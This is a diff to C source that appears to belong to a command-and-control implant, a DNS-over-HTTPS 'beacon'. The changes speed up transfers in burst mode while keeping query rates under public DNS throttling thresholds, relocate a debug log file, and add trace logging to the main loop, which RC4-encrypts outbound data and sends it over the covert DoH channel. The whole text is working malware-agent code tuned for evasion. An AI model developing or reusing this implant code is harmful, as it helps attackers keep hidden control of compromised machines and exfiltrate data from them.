@@ -370,8 +370,8 @@ void AgentMain()
 		}
 		g_Connector->RecvClear();
 
-		// 自适应 sleep：大流量时在 0~0.5 倍基础 sleep 区间内随机等待，任务结束后恢复原始 sleep/jitter。
-		if (g_Agent->IsActive() && packerOut->datasize() < 8) {
+			// 自适应 sleep：大流量时在 0~0.5 倍基础 sleep 区间内随机等待，任务结束后恢复原始 sleep/jitter。
+			if (g_Agent->IsActive() && packerOut->datasize() < 8) {
 			ULONG baseSleep = g_Agent->config->sleep_delay;
 			ULONG jitter    = g_Agent->config->jitter_delay;
 
@@ -385,7 +385,7 @@ void AgentMain()
 			if (burst) {
 				// 加速模式：强制将 sleep 限制在 50ms 以内，以实现连续快速传输（约 10-15 QPS）。
 				// 这既能显著加快 BOF/大文件传输速度，又通过 50ms 间隔保持在公共 DNS 的安全限流阈值内。
-				ULONG burstSleep = 50;
+				ULONG burstSleep = 20;
 				if (baseSleep < burstSleep)
 					burstSleep = baseSleep;
 				
@@ -427,16 +427,31 @@ void AgentMain()
 #include "DnsCompression.h"
 ConnectorDoH* g_Connector;
 
-// Simple debug logger for DoH beacon to trace early exits.
-// Writes to C:\\Windows\\Temp\\ax_doh_beacon.log using Kernel32 APIs
-// resolved via ApiLoader (ApiWin).
+// Append a log line to ax_doh_beacon.log in the current executable directory.
 static void DohDebugLog(const char* msg)
 {
-	if (!ApiWin || !ApiWin->CreateFileA || !ApiWin->WriteFile)
+	if (!msg) return;
+
+	CHAR path[MAX_PATH] = {0};
+	DWORD len = GetModuleFileNameA(NULL, path, MAX_PATH);
+	if (len == 0 || len >= MAX_PATH)
 		return;
 
-	CHAR path[] = "C:\\Windows\\Temp\\ax_doh_beacon.log";
-	HANDLE hFile = ApiWin->CreateFileA(path,
+	// Strip filename to get directory
+	for (int i = (int)len - 1; i >= 0; --i) {
+		if (path[i] == '\\' || path[i] == '/') {
+			path[i + 1] = '\0';
+			break;
+		}
+	}
+	// Append log filename
+	const CHAR logName[] = "ax_doh_beacon.log";
+	SIZE_T dirLen = lstrlenA(path);
+	if (dirLen + sizeof(logName) >= MAX_PATH)
+		return;
+	lstrcatA(path, logName);
+
+	HANDLE hFile = CreateFileA(path,
 		FILE_APPEND_DATA,
 		FILE_SHARE_READ,
 		NULL,
@@ -447,13 +462,12 @@ static void DohDebugLog(const char* msg)
 		return;
 
 	DWORD written = 0;
-	SIZE_T len = StrLenA((CHAR*)msg);
-	if (len)
-		ApiWin->WriteFile(hFile, msg, (DWORD)len, &written, NULL);
+	SIZE_T mlen = lstrlenA(msg);
+	if (mlen)
+		WriteFile(hFile, msg, (DWORD)mlen, &written, NULL);
 	CHAR crlf[] = "\r\n";
-	ApiWin->WriteFile(hFile, crlf, 2, &written, NULL);
-	// We intentionally do not close the handle via CloseHandle here to
-	// keep the logger minimal; the OS will reclaim it on process exit.
+	WriteFile(hFile, crlf, 2, &written, NULL);
+	CloseHandle(hFile);
 }
 
 void AgentMain()
@@ -464,16 +478,27 @@ void AgentMain()
 		return;
 	}
 	DohDebugLog("[DoH] ApiLoad OK");
+	DohDebugLog("[DoH] Before Agent allocation");
 
 	g_Agent = (Agent*)MemAllocLocal(sizeof(Agent));
 	*g_Agent = Agent();
+	DohDebugLog("[DoH] Agent constructed");
 
+	DohDebugLog("[DoH] Before Connector allocation");
 	g_Connector = (ConnectorDoH*)MemAllocLocal(sizeof(ConnectorDoH));
+	if (!g_Connector) {
+		DohDebugLog("[DoH] MemAllocLocal for ConnectorDoH failed");
+		return;
+	}
+	DohDebugLog("[DoH] Connector memory allocated, calling ctor");
 	*g_Connector = ConnectorDoH();
+	DohDebugLog("[DoH] ConnectorDoH ctor finished");
 		
 	ULONG beatSize = 0;
 	BYTE* beat = g_Agent->BuildBeat(&beatSize);
+	DohDebugLog("[DoH] BuildBeat completed");
 		
+	DohDebugLog("[DoH] Calling SetConfig");
 	if (!g_Connector->SetConfig(g_Agent->config->profile, beat, beatSize)) {
 		DohDebugLog("[DoH] SetConfig FAIL");
 		return;
@@ -485,9 +510,10 @@ void AgentMain()
 	packerOut->Pack32(0);
 
 	do {
+		DohDebugLog("[DoH] Loop: start iteration");
 		if (packerOut->datasize() > 4) {
 			packerOut->Set32(0, packerOut->datasize());
-		
+			DohDebugLog("[DoH] Loop: have outbound data, preparing frame");
 			BYTE* plainBuf = packerOut->data();
 			ULONG plainLen = packerOut->datasize();
 		
@@ -521,11 +547,14 @@ void AgentMain()
 			}
 		
 			if (!sessionBuf) {
+				DohDebugLog("[DoH] Loop: sessionBuf alloc failed, sending plainBuf");
 				EncryptRC4(plainBuf, (int)plainLen, g_Agent->SessionKey, 16);
 				g_Connector->SendData(plainBuf, plainLen);
+				DohDebugLog("[DoH] Loop: SendData(plainBuf) done");
 			} else {
 				EncryptRC4(sessionBuf, (int)sessionLen, g_Agent->SessionKey, 16);
 				g_Connector->SendData(sessionBuf, sessionLen);
+				DohDebugLog("[DoH] Loop: SendData(sessionBuf) done");
 				MemFreeLocal((LPVOID*)&sessionBuf, sessionLen);
 			}
 		
